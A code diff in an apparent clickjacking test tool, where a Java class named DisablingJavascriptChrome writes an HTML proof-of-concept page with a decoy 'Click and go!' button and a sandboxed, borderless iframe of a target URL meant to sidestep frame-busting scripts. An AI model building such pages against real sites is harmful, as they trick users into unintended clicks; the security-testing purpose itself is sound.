@@ -45,8 +45,16 @@ public class DisablingJavascriptChrome implements ClickJacking{
 	@Override
 	public void creation() throws IOException {
         BufferedWriter bw = new BufferedWriter(new FileWriter(f));
-        bw.write("<html><body>");
-        bw.write("<iframe src=\""+src+"\" sandbox class=\"malicious\"></iframe>");
+        bw.write("<html><head>\r\n"
+        		+ "<link rel=\"stylesheet\" href=\"opacity.css\">\r\n"
+        		+ "    </head>\r\n"
+        		+ "    <body>\r\n"
+        		+ "        <div id=\"content\">\r\n"
+        		+ "            <h1>Malicius Link</h1>\r\n"
+        		+ "            <form action=\"http://www.owasp.com\">\r\n"
+        		+ "                <input type=\"submit\" class=\"button\" value=\"Click and go!\">\r\n"
+        		+ "            </form>");
+        bw.write("<iframe  src=\""+src+"\" id=\"clickjacking\" width=\"500\" height=\"500\" scrolling=\"no\" frameborder=\"none\" sandbox class=\"malicious\"></iframe>");
         bw.write("</body></html>");
         bw.close();		
 	}
